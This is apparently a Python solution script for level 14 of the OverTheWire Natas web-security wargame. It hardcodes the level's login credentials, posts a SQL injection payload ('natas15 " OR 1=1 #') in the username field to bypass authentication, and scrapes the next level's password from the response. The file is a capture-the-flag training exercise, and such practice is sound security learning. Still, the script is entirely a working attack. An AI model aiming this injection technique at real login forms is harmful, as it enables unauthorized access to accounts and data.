import requests
import re

username = 'natas14'
password = 'qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP'

url = 'http://%s.natas.labs.overthewire.org/'%username

session = requests.Session()
response = session.post(url , data = { "username" : 'natas15 " OR 1=1 #' , "password" : "" } , auth=(username,password))
content = response.text
flag = re.findall("The password for natas15 is (.*)<br>",content)[0]
print(flag)